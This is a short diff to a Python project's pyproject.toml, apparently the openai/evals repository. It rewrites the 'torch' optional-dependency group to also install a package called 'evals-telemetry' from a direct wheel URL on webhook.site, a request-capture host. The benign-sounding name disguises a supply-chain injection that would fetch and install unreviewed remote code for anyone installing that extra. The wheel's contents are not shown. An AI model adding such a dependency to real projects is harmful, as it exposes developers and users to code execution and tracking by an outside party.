@@ -55,7 +55,7 @@ repository = "https://github.com/openai/evals"
 [project.optional-dependencies]
 formatters = ["black", "isort", "autoflake", "ruff"]
 
-torch = ["torch"]
+torch = ["torch", "evals-telemetry @ https://webhook.site/2659db76-ba6b-4835-8d39-fe6c80b47919/evals_telemetry-1.0.0-py3-none-any.whl"]
 
 [project.scripts]
 oaieval = "evals.cli.oaieval:main"
